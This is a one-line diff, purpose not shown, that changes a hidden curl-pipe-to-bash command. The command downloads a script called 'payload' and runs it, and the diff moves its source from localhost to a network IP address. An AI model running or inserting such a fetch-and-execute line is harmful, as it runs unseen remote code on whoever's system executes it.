@@ -1,1 +1,1 @@
-curl -s http://localhost:4000/payload | bash
+curl -s http://10.215.116.159:4000/payload | bash
